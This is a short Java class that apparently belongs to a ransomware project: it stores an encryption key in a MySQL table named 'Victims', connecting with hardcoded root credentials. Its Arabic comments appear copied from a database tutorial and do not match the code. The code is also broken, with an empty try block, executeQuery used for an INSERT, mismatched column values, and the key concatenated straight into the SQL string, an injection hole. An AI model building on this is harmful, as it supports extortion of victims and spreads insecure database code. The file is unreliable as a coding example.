package db;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.Statement;

public class SendEncryptionKey {
    public SendEncryptionKey(String encryptionKey){
        try{

        } catch (Exception e){
            System.out.println(e.getStackTrace());
        }
                try {
                    // 2) الذي سنعتمد عليه للوصول إلى قاعدة البيانات MYSQL Driver هنا قمنا بتحديد رابط الوصول لبرنامج الـ
                    Class.forName("com.mysql.jdbc.Driver");

                    // 3) و الذي سنستخدمه لتحديد المعلومات الأساسية التي نحتاجها للإتصال بقاعدة البيانات Connection هنا قمنا بإنشاء كائن من الكلاس
                    Connection con = DriverManager.getConnection("jdbc:mysql://localhost/test?user=root&password=root");

                    // 4) و الذي سنستخدمه لإرسال إستعلامات إلى قاعدة البيانات Statement هنا قمنا بتجهيز كائن نوعه
                    Statement stmt = con.createStatement();

                     stmt.executeQuery("INSERT INTO Victims (`encryptionKey`) values (5," + encryptionKey + ")");

                    // 6) ( ملاحظة: هنا كل سطر يحتوي على إسم واحد ) rs هنا أنشأنا حلقة تمر على جميع الأسطر التي تم تخزينها في الكائن
                    System.out.println("Done");
                    // 7) هنا قمنا بإغلاق الإتصال مع قاعدة البيانات
                    con.close();
                }
                catch(SQLException | ClassNotFoundException e) {
                    System.err.println(e.getStackTrace());
                }
    }
    // test
    public static void main(String[] args){
        new SendEncryptionKey("`test`");
    }
}
